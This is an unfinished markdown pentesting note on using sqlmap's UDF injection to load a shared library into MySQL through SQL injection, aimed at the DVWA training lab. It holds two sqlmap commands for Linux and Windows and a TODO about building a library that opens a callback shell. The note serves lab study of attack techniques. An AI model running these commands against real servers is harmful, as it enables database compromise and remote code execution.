---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - post-exploitation
  - server-side-attack
  - sqlmap
  - dvwa
---
# 02 - User Defined Function

TODO: Test UDF for MySQL and check what conditions does it requires.

> [!IMPORTANT] Conditions
> 1. The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.
> 2. 

## 2.1 - Linux

TODO: Compile the shared object linux file execute a callback shell when uploading it to the MySQL DBMS

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --udf-inject --shared-lib=/path/to/file.so
```

## 2.2 - Windows

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --udf-inject --shared-lib=/path/to/file.dll
```


--cleanup           Clean up the DBMS from sqlmap specific UDF and tables

---
## References

### Hacking Articles

- [Hacking Articles: Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)](https://www.hackingarticles.in/exploiting-webserver-using-sqlmap-metasploit-os-pwn/)